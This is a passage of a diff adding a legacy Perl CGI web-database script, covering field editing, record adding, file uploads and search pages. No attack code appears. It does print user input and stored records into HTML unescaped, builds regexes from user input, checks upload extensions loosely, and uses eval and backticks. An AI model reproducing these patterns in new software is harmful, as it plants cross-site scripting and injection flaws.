+        alert(\'Quotes are not allowed in field names\')\;
+        return\;
+   }\;
+	newtype=\"\"\;
+	while ((newtype!=\"text\")&&(newtype!=\"checkbox\")&&(newtype!=\"list\")&&
+  (newtype!=\"comment\")&&(newtype!=\"upload\")) {
+		newtype=prompt(\"Enter text, checkbox, comment, list, or upload\",\"text\")\;
+		if(!newtype) {return}\;
+	}\;
+	if (newtype==\"text\") {
+		newval=\":\"+prompt(\"Enter how many characters:\",\"20\")
+		if (newval==\":null\") {return}\;
+	}\;
+	if (newtype==\"checkbox\") {newval=\"\"}\;
+	if (newtype==\"list\") {
+		newval=\":\"+prompt(\"Enter each value in list with a comma in between:\",\"\")
+		if(newval==\":null\") {return}\;
+	}\;
+	if (newtype==\"comment\") {
+		newval=\":\"+prompt(\"Enter how many rows high you would like the comment box:\",\"4\")\;
+		if(newval==\":null\") {return}\;
+	}\;
+ if (newtype==\"upload\") {
+  if(newfield.indexOf(\' \')>-1) {
+         alert(\'uploads cannot have spaces in the name because they are used in a URL\')\;
+         return\;
+  }
+  newval=\":\"+prompt(\"Enter the maximum number of Kilobytes for each upload:\",\"100\")\;
+  if(newval==\":null\") {return}\;
+  ext=prompt(\"Enter the filename extensions which are allowed to be uploaded, seperated by a comma..\\nFor example: gif,jpg,doc,htm,html,xls\",\"gif,jpg\")\;
+  if(ext==\":null\") {return}\;
+  newval+=\":\"+ext\;
+ }\;
+ 
+   document.form2.newFieldName.value=newfield+\"::\"+newtype+newval\;
+   document.form2.selectedField.value=s.selectedIndex\;
+   document.form2.cgifunction.value=\"insertField\"\;
+   document.form2.submit()\;
+}
+
+function del(s) {
+   if (s.selectedIndex<0) {return}
+   message=\"Are you sure you want to delete the selected field?\\n\"\;
+   message+=\" Any data contained in that field will be destroyed.\"\;
+   if(confirm(message)) {
+     document.form2.selectedField.value=s.selectedIndex\;
+     document.form2.cgifunction.value=\"deleteField\"\;
+     document.form2.submit()\;
+   }
+}
+
+function rename(s) {
+	oldfield=s.options[s.selectedIndex].text\;
+	del1=oldfield.indexOf(\'::\')\;
+	oldname=oldfield.substring(0,del1)\;
+	oldfield=oldfield.substring(del1+2,9999)\;
+	del1=oldfield.indexOf(\':\')\;
+	if (del1==-1) {del1=9999}\;
+	oldtype=oldfield.substring(0,del1)\;
+	oldfield=oldfield.substring(del1+1,9999)\;
+	oldvalue=oldfield.substring(0,9999)\;
+
+   newfield=prompt(\"New Field Name:\",oldname)\;
+   if (!newfield) {return}\;
+   if ((newfield.indexOf(\'\\\"\')>-1)||(newfield.indexOf(\'\\\'\')>-1)) {
+        alert(\'Quotes are not allowed in field names\')\;
+        return\;
+   }\;
+	newtype=\"\"\;
+while ((newtype!=\"text\")&&(newtype!=\"checkbox\")&&(newtype!=\"list\")&&(newtype!=\"comment\")&&(newtype!=\"upload\")) {
+		newtype=prompt(\"Enter text, checkbox, comment, list, or upload\",oldtype)\;
+		if(!newtype) {return}\;
+	}\;
+	if (newtype!=oldtype) {oldvalue=\"\"}\;
+	if (newtype==\"text\") {
+		newval=\":\"+prompt(\"Enter how many characters:\",oldvalue)
+		if (newval==\":null\") {return}\;
+	}\;
+	if (newtype==\"checkbox\") {newval=\"\"}\;
+	if (newtype==\"list\") {
+		newval=\":\"+prompt(\"Enter each value in list with a comma in between:\",oldvalue)
+		if(newval==\":null\") {return}\;
+	}\;
+	if (newtype==\"comment\") {
+		newval=\":\"+prompt(\"Enter how many rows high you would like the comment box:\",oldvalue)\;
+		if(newval==\":null\") {return}\;
+	}\;
+        if (newtype==\"upload\") {
+        if(newfield.indexOf(\' \')>-1) {
+          alert(\'uploads cannot have spaces in the name because they are used in a URL\')\;
+          return\;
+        }
+        newval=\":\"+prompt(\"Enter the maximum number of Kilobytes for each upload:\",\"100\")\;
+        if(newval==\":null\") {return}\;
+        ext=prompt(\"Enter the filename extensions which are allowed to be uploaded, seperated by a comma..\\nFor example: gif,jpg,doc,htm,html,xls\",\"gif,jpg\")\;
+        if(ext==\":null\") {return}\;
+        newval+=\":\"+ext\;
+   }\;
+ 
+   document.form2.newFieldName.value=newfield+\"::\"+newtype+newval\;
+   document.form2.selectedField.value=s.selectedIndex\;
+   document.form2.cgifunction.value=\"renameField\"\;
+   document.form2.submit()\;
+
+}
+
+function admin() {
+   document.form2.cgifunction.value=\"admin\"\;
+   document.form2.submit()\;
+}
+
+function clear() {
+   document.form1.list.selectedIndex=-1;
+}
+
+
+   
+
+
+</SCRIPT>
+</HEAD>
+<BODY BGCOLOR=\"beige\" onLoad=\"document.form1.list.selectedIndex=$select\;document.form1.insert_button.focus()\">
+<H1>Modify Field List</H1>
+<FORM NAME=\"form1\" ACTION=\"$cgilocation\" METHOD=POST>
+<TABLE BORDER=0><TR><TD>
+<SELECT NAME=\"list\" SIZE=$num>
+";
+    foreach $field (@fields) {
+	chop($field);
+	print "<OPTION VALUE=\"$field\">$field\n";
+    };
+
+    print "
+</SELECT>
+<TR><TD>
+
+<P><INPUT TYPE=\"BUTTON\" NAME=\"insert_button\" VALUE=\"INSERT FIELD BELOW SELECTION\"
+onClick=\"insert(form.list)\"><BR>
+<INPUT TYPE=\"BUTTON\" VALUE=\"DELETE SELECTED FIELD\"
+onClick=\"del(form.list)\"><BR>
+<INPUT TYPE=\"BUTTON\" VALUE=\"REDEFINE SELECTED FIELD\"
+onClick=\"rename(form.list)\">
+
+
+</TABLE>
+
+</FORM>
+<B>Remember, whenever you add or remove fields, you need to change your field selections on the 'customize pages' screen.</B><P>
+
+To create a text box: Click Insert or Redefine field.  Enter the field\'s name in the first prompt box.  Enter the word \"text\" in the second prompt box.  Enter the SIZE in number of characters for the new text box.<P>
+
+To create a checkbox: Click Insert or Redefine field.  Enter the field\'s name in the first prompt box.  Enter the word \"checkbox\" in the second prompt box.  That's it.<P>
+
+To create a selection list: Click Insert or Redefine field. Enter the field\'s name in the first prompt box.  Enter the 
+word \"list\" in the second prompt box.  In the third prompt box, enter the list of values, seperated by a comma without spaces around the comma.  For example.<BR><B>Fire Engine Red,Lemon Yellow,Medium Blue,Salmon,Crimson,Ash White</B><P>
+
+To create a textarea box for comments: Click Insert or Redefine field. Enter the field\'s name in the first
+prompt box.  Enter the word \"comment\" in the second prompt box.  In the third box, enter the number of rows high you wish
+to make your comment box. It will have a width of 60 characters.
+<P>
+To create an upload field with the option to upload with a web browser, enter the word \"upload\" in the second prompt box.  In the third box, for security,
+enter the maximum size in Kilobytes for uploaded pictures or files.  <B>You must have the CGI.pm module to use this feature</B>
+
+<P>
+<A HREF=\"javascript:admin()\">Return to Administration Page</A>
+<P>
+To insert a field at the <i>top</i> of the list, do not select anything.<BR>
+<A HREF=\"javascript:clear()\">
+Click here to clear the selection</A>
+<FORM NAME=\"form2\" ACTION=\"$cgilocation\" METHOD=POST>
+<INPUT TYPE=HIDDEN NAME=\"selectedField\">
+<INPUT TYPE=HIDDEN NAME=\"newFieldName\">
+<INPUT TYPE=HIDDEN NAME=\"cgifunction\">
+";
+
+};
+
+
+#*******END FIELDMOD SUBROUTINE**********
+
+#*******BEGIN USER SUBROUTINE*************
+sub user {
+&language;
+open(FIELDS,"<$fieldnames") or &error("Could not open $fieldnames");
+@fieldsData=<FIELDS>;
+close FIELDS;
+$usemulti=0;
+foreach (@fieldsData) {
+	($field,$type)=split(/::/);
+	push(@fields,"$field\n");
+	push(@types,"$type");
+	$usemulti=1 if (($type=~/upload/)&&($useradd));
+};
+shift(@fields);
+shift(@types);
+if ($searchPage ne "${cgilocation}?cgifunction=user") {
+  print "<SCRIPT>location.replace(\'$searchPage\')</SCRIPT>\n";
+  print "<NOSCRIPT><A HREF=\"$searchPage\">JavaScript disabled<BR>Click here to go to the search page</A></NOSCRIPT>";
+  exit;
+};
+print "
+<HEAD><TITLE>Database Search</TITLE></HEAD>\n";
+&bodytag;
+print "$searchHeader";
+print "$instructions" if $searchInfo;
+if ((length($reqfields)>0)&&($useradd)) {
+  print "<P><B>* </B><I>$indicatesRequiredFields</I><BR>";
+}
+print "<form name=\"form1\" action=\"$cgilocation\" method=post";
+print " ENCTYPE=\"multipart/form-data\"" if (($usemulti)&&(!$searchbox));
+print ">\n";
+
+if (length($user_data{cgilanguage})>0) {
+  print "<INPUT TYPE=HIDDEN NAME=\"cgilanguage\" 
+  VALUE=\"$user_data{cgilanguage}\">\n";
+}
+if ($searchbox) {
+  print "<B>Enter your search words</B>
+<INPUT TYPE=TEXT SIZE=40 NAME=\"all_search\">
+<BR>Show records containing
+<SELECT NAME=\"allany\" SIZE=1><OPTION VALUE=\" and \">all</OPTION>
+<OPTION VALUE=\" or \">any</OPTION></SELECT>of the search words.
+<INPUT TYPE=HIDDEN NAME=\"cgifunction\" VALUE=\"Search\">
+<INPUT TYPE=SUBMIT VALUE=\"Search\">
+";
+  
+} else {
+  print "
+<TABLE>
+";
+$ftcount=0;
+foreach (@SFsequence) {
+   $field=$fields[$_];
+	  &gettype($types[$_]);
+	  chop($field);
+	  print "<TR><TD>";
+	  print "<B>* </B>" if ($reqfields=~/(^|\,)$_($|\,)/)&&($useradd);
+	  print "<B>$field</B></TD>";
+	  if ($type eq "text") {
+	       print "<TD><input type=$type name=\"$field\" size=$typesize></TD></TR>\n";
+	  };
+	  if ($type eq "checkbox") {
+		  print "<TD><input type=checkbox name=\"$field\" value=\"yes\"></TD></TR>\n";
+	  };
+	  if ($type eq "list") {
+	  	  print "<TD><SELECT NAME=\"$field\" SIZE=1>\n";
+		  print "<OPTION VALUE=\"\">\n";
+		  foreach (@typelistvals) {
+			print "<OPTION>$_\n";
+		  };
+		  print "</SELECT></TD></TR>\n";
+	  };
+	  if ($type eq "comment") {
+		  print "<TD><TEXTAREA NAME=\"$field\" COLS=60 ROWS=$typerows></TEXTAREA></TD></TR>\n";
+	  };
+	  if ($type eq "upload") {
+	    print "<TD><INPUT NAME=\"$field\" TYPE=\"file\"></TD></TR>\n";
+	  };
+	  $ftcount++;
+};
+print "</TABLE><BR>";
+  if (($usersearch)&&(!$useradd)) {
+print "<INPUT TYPE=HIDDEN NAME=\"cgifunction\" VALUE=\"$searchButton\">";
+print "<input type=submit value=\"$searchButton\"> ";
+  }
+  elsif ((!$usersearch)&&($useradd)) {
+print "<INPUT TYPE=HIDDEN NAME=\"cgifunction\" VALUE=\"$addButton\">";
+print "<input type=submit value=\"$addButton\"> ";
+  }
+  elsif (($usersearch)&&($useradd)) {
+print "<input type=submit name=\"cgifunction\" value=\"$searchButton\"> ";
+print "<input type=submit name=\"cgifunction\" value=\"$addButton\"> ";
+  };
+print "<input type=reset value=\"$clearButton\">";
+} #END OF SEARCHBOX IF-ELSE
+print "
+</FORM>
+";
+
+};
+
+
+#*******END USER SUBROUTINE***************
+
+#******BEGIN BODYTAG SUBROUTINE********
+sub bodytag {
+  print "<BODY";
+  print " BGCOLOR=\"$reportColor\"" if length($reportColor)>0;
+  print " BACKGROUND=\"$background\"" if length($background)>0;
+  print " TEXT=\"$textcolor\"" if length($textcolor)>0;
+  print " LINK=\"$linkcolor\"" if length($linkcolor)>0;
+  print " VLINK=\"$vlinkcolor\"" if length($vlinkcolor)>0;
+print ">\n";
+}
+#******END BODYTAG SUBROUTINE
+
+#********BEGIN ADD SUBROUTINE**************
+sub add {
+  &checkpass if $useradd!=1;
+  &language;
+  open(FIELDS,"<$fieldnames") or &error("Could not open $fieldnames");
+  @fieldsData=<FIELDS>;
+  close FIELDS;
+  foreach (@fieldsData) {
+    ($field,$type)=split(/::/);
+    push(@fields,"$field\n");
+    push(@types,"$type");
+  };
+  @value=();
+  $body="The following record has been added to the $cgilocation database.\n\n";
+  $value[0]=time();
+  $fcount=1;
+  chomp(@fields);
+  shift(@fields);
+  $missingReqs=0;
+  $isEmpty=1;
+  foreach $fname (@fields) {
+    $value[$fcount]=$user_data{$fname};
+    $reqnum=$fcount-1;
+    if ((length($user_data{$fname})==0)&&($reqfields=~/(^|\,)$reqnum($|\,)/)) {
+      $reqerror.="<B>$fname</B> is a required field.<P>";
+      $missingReqs=1;
+    }
+    if (length($user_data{$fname})>0) {$isEmpty=0};
+    $body.="$fname\: $user_data{$fname}\n";
+    &gettype($types[$fcount]);
+    #UPLOAD IF IT IS AN UPLOAD FIELD
+    if (($type eq "upload")&&(length($user_data{$fname})>0)&&(!$missingReqs)) {
+      if ($user_data{$fname}=~/([^\\\/\:]+$)/) {$INfilename=lc($1)};
+	  $INfilename=~s/[^a-zA-Z0-9\_\.]//g;
+	  if ($INfilename=~/\.([a-zA-Z0-9]+)$/) {$extension=$1};
+	  if ($typeexts!~/,*${extension},*/i) {
+	&error("Only the following filetypes are allowed. $typeexts");
+      }
+      $OUTfilename="${value[0]}_${fname}_${INfilename}";
+      $value[$fcount]="${uploadsURL}$OUTfilename";
+      $uploadsize=0;
+      @filecontents=();
+      while ($bytesread=read($user_data{$fname},$buffer,1024)) {
+	$uploadsize+=length($buffer);
+	push(@filecontents,$buffer);
+      }
+      
+      if ($uploadsize>$typesize*1000) {
+	&error("upload size = $uploadsize bytes.<P>The upload can only be a maximum of ${typesize}KB")
+      };
+      open (OUTFILE,">${uploadsdir}${OUTfilename}") or &error("Could not open ${uploadsdir}$OUTfilename for writing");
+      binmode(OUTFILE);
+      print OUTFILE (@filecontents);
+      close OUTFILE;
+      close ($user_data{$fname});
+    }
+    
+    #END UPLOAD
+    $fcount++;
+  };
+  
+  if ($isEmpty) {$reqerror.="No data was submitted<P>"};
+  if (($missingReqs)||($isEmpty)) {
+    &bodytag;
+    print "Your record was not added for the following reasons:<P>\n";
+    print "$reqerror";
+    print qq(<A HREF="javascript:history.go(-1)">Return to previous page</A>);
+    exit;
+  }
+
+  #pop(@value);  #** Remove cgifunction from @value array **
+  #if ($user_data{pagenum}>0) {pop(@value)}; #** remove pagenum from @value array
+  foreach (@value) {
+    $_=~s/\r/\n/g;
+    $_=~s/\n\n/\n/g;
+    $_=~s/\n/<BR>/g;
+  };
+  print "
+<HEAD><TITLE>Webdata Entry Added</TITLE></HEAD>";
+  &bodytag;
+  
+  #******* Remove delimeter characters and leading spaces*********
+  foreach $item (@value) {
+    $item=~s/^( *)//ge;   # remove leading spaces from entries
+    $item=~s/::/'&#58;&#58;'/ge;  # replace delimiting character from entries
+  };
+  
+  #****Check to see if entry is already used****
+  &putlock; #place a lock file in the uploads dir to prevent simultanious writing.
+  open(READLOG,"<$logfile");
+  @entries = <READLOG>;
+  close READLOG;
+  &removelock; #remove lock file
+  $unique="true";
+  $line = $entries[$#entries];
+  @data = split(/::/,$line);
+  shift(@data);
+  pop(@data);
+  $comp1=join('::',@data);
+  @data=@value;
+  shift(@data);
+  $comp2=join('::',@data);
+  if ($comp1 eq $comp2) {
+    $unique="false";
+  };
+  
+  
+  #********Add values to $logfile file*******************
+  if($unique eq "true") {
+    &putlock; #place a lock file in the uploads dir to prevent simultanious writing.
+    push(@value,"admin");
+    open(LOGFILE,">>$logfile") or &error("Could not open $logfile");
+    $line=join("::",@value);
+    print LOGFILE ("$line\n");
+    close(LOGFILE);
+    &removelock; #remove lock file.
+    print "$addresponse</H1><P>";
+  } else {
+    print "<font color=\"red\">";
+    print "That entry matches the previous entry exactly. It is probably a duplicate entry.  Submission cancelled.</h1></font>";
+  };
+  
+  #****RETURN TO MAINTENANCE SCREEN****
+  print "<A HREF=\"javascript:history.go(-1)\">
+$returntoprevious</h1></A>
+";
+  if (length($email)>0) {
+    if ($^O=~/win/i) {
+      open (MAIL,">${uploadsdir}mail.txt");
+      print MAIL ("$body\n");
+      close MAIL;
+      $tmp=`$sendmail ${uploadsdir}mail.txt -s \"New Record Added to Database\" -t $email -q`;
+    } else {
+      open (MAIL,"|$sendmail -t") or &error("Could not open $sendmail");
+      print MAIL ("To: $email\nFrom: $email\n");
+      print MAIL ("Subject:New Record Added to Database\n$body\n");
+      close MAIL;
+    }
+  }
+};
+#*********END ADD SUBROUTINE********************
+
+
+
+#**********BEGIN SEARCH SUBROUTINE******************
+sub adminsearch {
+&memberpass;
+print "
+<HEAD><TITLE>Webdata Admin Search</TITLE></HEAD>
+<SCRIPT>
+   function modify(sym) {
+       document.form1.part.value=sym\;                
+       document.form1.submit()\;
+   }
+
+function goadmin() {
+document.form1.cgifunction.value=\"";
+if ($userid eq "admin") {
+	print "admin";
+} else {
+	print "memberpage"
+};
+print "\"\;
+document.form1.submit()\;
+}
+
+function deleteset() {
+	msg=\'This will permanently delete all of\\n\'+
+	\'the records found in your search.  Are you\\n\'+
+	\'sure that you want to do this?\'\;
+	if (confirm(msg)) {
+		document.form1.cgifunction.value=\"deleteset\"\;
+		document.form1.submit()\;
+	}\;
+}
+
+function exportset(f) {
+        document.form1.cgifunction.value=\"exportset\"\;
+        document.form1.delimiter.value=f.delimiter.options[f.delimiter.selectedIndex].text\;
+        if (f.includeID.checked) {
+            document.form1.includeID.value=1;
+        } else {
+            document.form1.includeID.value=0;
+        }
+        document.form1.submit()\;
+}
+
+function deleteSelected(f) {
+        document.form1.selectedset.value=\"\"\;
+        for(i=0\;i<f.elements.length\;i++) {
+               if (f.elements[i].checked) {
+                       document.form1.selectedset.value+=\"\"+f.elements[i].value+\"\:\"\;
+               }
+        }
+}
+
+function deleteSelected2() {
+	msg=\'This will permanently delete all of\\n\'+
+	\'the records selected with checkboxes.  Are you\\n\'+
+	\'sure that you want to do this?\'\;
+	if (confirm(msg)) {
+                document.form1.foundset.value=document.form1.selectedset.value;
+                if (document.form1.foundset.value != document.form1.selectedset.value) {
+                        alert(\'There was a JavaScript error. Delete failed.\')\;
+                        return\;
+                }
+		document.form1.cgifunction.value=\"deleteset\"\;
+		document.form1.submit()\;
+	}\;
+        
+}
+</SCRIPT>\n
+
+<H1 ALIGN=CENTER>Administration Search Page</H1>
+";
+
+&putlock; #place a lock file in the uploads dir to prevent simultanious writing.
+open(LOGFILE,"<$logfile") or &error("Could not open $logfile");
+@entries = <LOGFILE>;
+close (LOGFILE);
+&removelock; #remove lock file
+print "<BODY BGCOLOR=\"BEIGE\">\n";
+print "<FORM NAME=\"results\"><TABLE BORDER=1 bgcolor=\"white\">\n"; 
+open(FIELDS,"<$fieldnames") or &error("Could not open $fieldnames");
+@fieldsData=<FIELDS>;
+close FIELDS;
+foreach (@fieldsData) {
+	($field,$type)=split(/::/);
+	push(@fields,"$field\n");
+	push(@types,"$type");
+};
+$fcount=1;
+@value=();
+shift(@fields);
+foreach (@fields) {
+	chop($_) if (/\n$/);
+	$value[$fcount]=$user_data{$_};
+	$fcount++;
+};
+if ($userid ne "admin") {push(@value,"^$userid\$")};
+shift(@value);
+unshift(@value,$user_data{date_created});
+$header= "<TR><TH><FONT SIZE=-2>Delete</TH><TH><FONT SIZE=-2>Date<BR>Created</TH>";
+if ($limitAdminColumns!=1) { 
+  foreach $field (@fields) {
+      $header .= "<TH>$field</TH>";
+  };
+} else {
+  foreach (@sequence) {
+      $header .= "<TH>$fields[$_]</TH>";
+  };
+};
+print  "$header\n";
+
+#***** BEGIN STEPPING THROUGH ALL THE DATA LINES*****
+#***** PARSE THE DATA *****************
+foreach $line (@entries) {
+  @fields = split(/::/,$line);
+	$ID = shift(@fields);
+	$dateCreated=&getDate($ID);
+        unshift(@fields,$dateCreated);
+	# *** IF LINE MATCHES PATTERN ***********
+	$display="true";
+	$numPairs=@value;
+	for ($i=0;$i<$numPairs;$i++) {
+	  if ($value[$i]=~/[0-9][0-9]?\/[0-9][0-9]?\/[0-9][0-9]+/) {
+	  $_=$value[$i];
+		@temp=m/([0-9][0-9]?\/[0-9][0-9]?\/[0-9][0-9]+)/g;
+		$temp[0]=&datetonum($temp[0]);
+		$temp[1]=&datetonum($temp[1]);
+		if (/^([><=]+)/) {$temp3=$1};
+		$criteria=$temp3.$temp[0];
+		if (/^between/i) {$criteria="between $temp[0] and $temp[1]"};
+		if ($fields[$i]=~/[0-9][0-9]?\/[0-9][0-9]?\/[0-9][0-9]+/) {
+		  $dataval=&datetonum($fields[$i]);
+		      } else {
+		  $display="false";
+		      };
+	      } else {
+	  $dataval=$fields[$i];
+		$criteria=$value[$i];
+	      };
+	$_=$dataval;
+	$criteria=~s/ or /\|/gi;
+	#remove currency and commas
+	if (/^[\d\£\$\,\.]+$/) {
+	  $_=~s/[\£\$\,]//g;
+	  $criteria=~s/[\£\$\,]//g;
+	}
+        $criteria=~s/([\*\+\?\.\/\(\)])/\\$1/g;
+	$firstchar=substr($criteria,0,1);
+	$combo="false";
+	if (!((/$criteria/i)||($criteria eq "")||
+	      ($firstchar eq '<')||($firstchar eq '>')||
+	      ($criteria=~/ and /i))) {
+	  $display="false";
+	      };
+	
+	if ((substr($criteria,0,2) eq '<=')&&($_ > substr($criteria,2,99))) {
+	  $combo="true";
+	  $display="false";
+	};
+	  if ((substr($criteria,0,2) eq '>=')&&($_ < substr($criteria,2,99))) {
+	    $combo="true";
+	    $display="false";
+	  };
+	  
+	  if (($combo ne "true")&&(substr($criteria,1,1) ne '=')) {
+	    if ((substr($criteria,0,1) eq '<')&&($_ >= substr($criteria,1,99))) {
+	      $display="false";
+	    };
+	    if ((substr($criteria,0,1) eq '>')&&($_ <= substr($criteria,1,99))) {
+	      $display="false";
+	    };
+	    
+	    if ($criteria=~/^between.* and /i) {
+	      $andpos = index($criteria,'and');
+	      if ($andpos<8) {$display="false";};
+	      $val1 = substr($criteria,7,$andpos);
+	      $val2 = substr($criteria,$andpos+4,99);
+	      if (($_<$val1)||($_>$val2)) {
+		$display="false";
+	      };
+	    };
+	    if (($criteria=~/ and /i)&&(!($criteria=~/^between/i))) {
+	      @cdata=split(/ and /i,$criteria);
+	      foreach $citem (@cdata) {
+		if(!(/$citem/i)) {$display="false";};
+	      };
+	    };	
+	  };
+	};
+  #***** DISPLAY THE LINE ****************
+  shift(@fields);
+  if (!$user_data{pagenum}) {
+    $user_data{pagenum}=1;
+    $querystring=~s/cgifunction/pagenum=1\&cgifunction/;
+  };
+  $pagenum=$user_data{pagenum};
+  $min=($pagenum-1)*20;
+  $max=$pagenum*20;
+  if ($display eq "true") {
+    $count++;
+    if (($count>$min)&&($count<=$max)) {
+      print "\n<TR>";
+      print "<TD><INPUT TYPE=CHECKBOX VALUE=\'$ID\' onClick=\"deleteSelected(form)\"></TD>";
+      print "<TD><A HREF=\"javascript:modify(\'$ID\')\">$dateCreated</A></TD>";
+      if ($limitAdminColumns!=1) {
+	foreach $n (@fields) {
+	  print "<TD><A HREF=\"javascript:modify(\'$ID\')\">";
+	  if ($n eq "") {$n = '&nbsp;</A>';};
+	  $n=~s/[\r\n]/<BR>/g;
+	  print "$n</A></TD>";
+	};
+      } else {
+	foreach (@sequence) {
+	  $n=$fields[$_];
+	  print "<TD><A HREF=\"javascript:modify(\'$ID\')\">";
+	  if ($n eq "") {$n = '&nbsp;</A>';};
+	  $n=~s/[\r\n]/<BR>/g;
+	  print "$n</A></TD>";
+	};
+      };
+    };
+    push(@foundset,$ID);
+  };
+  print "</TR>";
+};
+
+print "\n</table></FORM>\n";
+
+$foundsetstring=join(':',@foundset);
+print "<form name=\"form1\" action=\"$cgilocation\" method=post>\n";
+print "<input name=\"part\" type=hidden>\n";
+print "<input name=\"password\" type=hidden>\n";
+print "<input name=\"cgifunction\" type=hidden value=\"maintenance\">\n";
+print "<input name=\"foundset\" type=hidden value=\"$foundsetstring\">\n";
+print "<input name=\"selectedset\" type=hidden>\n";
+print "<input name=\"delimiter\" type=hidden>\n";
+print "<input name=\"includeID\" type=hidden>\n";
+print "</form>\n";
+if ($count>0) {
+print "<h2>Click on an entry to modify it. </h2>
+<form>
+<input type=button value=\"Delete Only Selected Records\"
+  onClick=\"deleteSelected2()\"> 
+
+Export all $count records to browser as a 
+<SELECT NAME=\"delimiter\"><OPTION>comma<OPTION>tab</SELECT>
+delimited file. <BR>
+Include ID, Date, and Owner (leave unchecked to import the data later)?
+<INPUT TYPE=\"checkbox\" NAME=\"includeID\" CHECKED> \&nbsp\;
+<input type=button value=\"Export\" onClick=\"exportset(form)\"><BR>
+</form>
+";
+
+#BEGIN NEXT/PREV BUTTONS
+$min++;
+
+if ($max>$count) {$max=$count};
+print "
+<B>Results $min - $max of $count</B> 
+<table border=0 cellspacing=10 cellpadding=0><TR><TD>
+";
+if ($min>1) {print "
+
+<FORM ACTION=\"$cgilocation\" METHOD=POST>
+<INPUT TYPE=HIDDEN NAME=\"query\" VALUE=\"$querystring\">
+<INPUT TYPE=HIDDEN NAME=\"pagenum\" VALUE=\"$pagenum\">
+<INPUT TYPE=SUBMIT NAME=\"cgifunction\" value=\"Previous Page\">
+</FORM>
+"};
+if ($max<$count) {print "
+<TD>
+<FORM ACTION=\"$cgilocation\" METHOD=POST>
+<INPUT TYPE=HIDDEN NAME=\"query\" VALUE=\"$querystring\">
+<INPUT TYPE=HIDDEN NAME=\"pagenum\" VALUE=\"$pagenum\">
+<INPUT TYPE=SUBMIT NAME=\"cgifunction\" value=\"Next Page\">
+</FORM>
+"};
+print "</table>";
+#END NEXT/PREV BUTTONS
+} else {
+  print "<B>No records were found</B><P>";
+};
+#CREATE LINKS TO ANY PAGENUMBER
+print "<BR>Go to page\:";  
+$numpages=int($count/20);
+$myquery=$querystring;
+if ($count/20>$numpages) {$numpages++;};
+for ($i=1;$i<=$numpages;$i++) {
+    $myquery=~s/pagenum=[0-9]*/pagenum=$i/;
+    print "<A HREF=\"$cgilocation\?$myquery\">$i</A> ";
+};
+
+print "<BR><A HREF=\"javascript:goadmin()\">Return to Administration Page</A>\n";
+
+print "<P><A HREF=\"$homepage\">
+Return to home page</A>\n";
+};
+
+#*********END OF ADMINSEARCH SUBROUTINE************
+
+#**********BEGIN USERSEARCH SUBROUTINE******************
+#*****Same as Search except the results****************
+#*****Do not link to maintenance       ***************
+#
+sub usersearch {
+  if ($usersearch!=1) {
+    if ($membersCanSearch) {
+      &memberpass;
+    } else {
+      &checkpass;
+    };
+  };
+  
+  &language;
+  if ($usesql==1) {&sqlsearch;exit;}
+  
+  $alt=0;
+  pop(@value);   #** Remove cgifunction from @value array **
+  pop(@value);   #** Remove pagnum from @value array **
+  shift(@value);  #remove ID from @value array **
+  &putlock; #place a lock file in the uploads dir to prevent simultanious writing.
+  open(LOGFILE,"<$logfile") or &error("Could not open $logfile");
+  @entries = <LOGFILE>;
+  close (LOGFILE);
+  &removelock; #remove lock file  
+
+  #PARSE/SORT ROUTINE
+  if ($reportSort>0) {
+    #...populate sorting array
+    $sortcount=0;
+    $textsort="false";
+    foreach (@entries) {
+      @data=split(/::/);
+      $val=lc($data[$reportSort]);
+      if ($val=~/^[0-9][0-9]?\/[0-9][0-9]?\/[0-9][0-9]*$/) {$val=&datetonum($val)};
+      if ($val=~/[a-zA-Z]/) {$textsort="true"};
+      if ($val=~/^[\d\£\$\,\. ]+$/) {$val=~s/[\£\$\, ]//g};
+      $sortarray{$sortcount}=$val;
+      
+      $val2=lc($data[$reportSort2]);
+      if ($val2=~/^[0-9][0-9]?\/[0-9][0-9]?\/[0-9][0-9]*$/) {$val2=&datetonum($val2)};
+      if ($val2=~/[a-zA-Z]/) {$textsort2="true"};
+      if ($val2=~/^[\d\£\$\,\. ]+$/) {$val2=~s/[\£\$\, ]//g};
+      $sortarray2{$sortcount}=$val2;
+      $sortcount++;
+    };
+    
+    if ($reportOrder==1) {$bottom="\$a";$top="\$b"} else
+      {$top="\$a";$bottom="\$b"};
+    if ($textsort eq "true") {$oper="cmp"} else {$oper="<=>"};
+    
+    if ($reportOrder2==1) {$bottom2="\$a";$top2="\$b"} else
+      {$top2="\$a";$bottom2="\$b"};
+    if ($textsort2 eq "true") {$oper2="cmp"} else {$oper2="<=>"};
+    
+    eval('@sortarray=sort {
+  $sortarray{'.$top.'} '.$oper.' $sortarray{'.$bottom.'}
+  or $sortarray2{'.$top2.'} '.$oper2.' $sortarray2{'.$bottom2.'}
+} keys %sortarray;');
+    
+    foreach (@sortarray) {push(@temp,$entries[$_])};
+    @entries=@temp;
+  };
+  
+  print "<HEAD><TITLE>Search Results page $user_data{pagenum}</TITLE></HEAD>";
+  &bodytag;
+  print "$reportHeader\n";
+  #print search criteria
+  while (($k,$v)=each(%user_data)) {
+    if (($k!~/^(cgifunction|cgilanguage|pagenum)$/)&&
+       (length($v)>0)) {
+      $usercriteria.="$k=$v ";
+    };
+  };
+  print "<BR><B>$usercriteria</B><BR>\n" if $showCriteria;
+  if (!$user_data{pagenum}) {
+    $user_data{pagenum}=1;
+    $querystring=~s/cgifunction/pagenum=1\&cgifunction/;
+  };
+  $pagenum=$user_data{pagenum};
+  if ($searchTemplateOn) {
+    print "\n";
+  } else {
+    $cellpadding="";
+    if ($hideBorder==1) {$Border=0; $cellpadding=" CELLPADDING=5 CELLSPACING=0 "} else {$Border=1};
+    
+    print "<TABLE $cellpadding BORDER=$Border bgcolor=\"white\">\n";
+  }
+  
+  open(FIELDS,"<$fieldnames") or &error("Could not open $fieldnames");
+  @fieldsData=<FIELDS>;
+  close FIELDS;
+  foreach (@fieldsData) {
+    ($field,$type)=split(/::/);
+    push(@fields,"$field\n");
+    push(@types,"$type");
+  };
+  shift(@fields);
+  #POPULATE @VALUE INDEPENDENT OF SEQUENCE
+  $fcount=0;
+  foreach (@fields) {
+    chop($_);
+    $value[$fcount]=$user_data{$_};
+    $fcount++;
+  };
+  
+  $header= "<TR";
+  $header.= " bgColor=\"$headerColor\"" if length($headerColor)>0;
+  $header.= ">";
+  if ($reportForm==1) {$header.="<TH>";};
+  foreach (@sequence) {
+    $header .= "<TH><FONT $tableFont>$fields[$_]</FONT></TH>";
+  };
+  $header.="</TR>";
+  print  "$header\n" if !$searchTemplateOn;
+  #***** BEGIN STEPPING THROUGH ALL THE DATA LINES*****
+  #***** PARSE THE DATA *****************
+  $date=0;
+ LINES: foreach $line (@entries) {
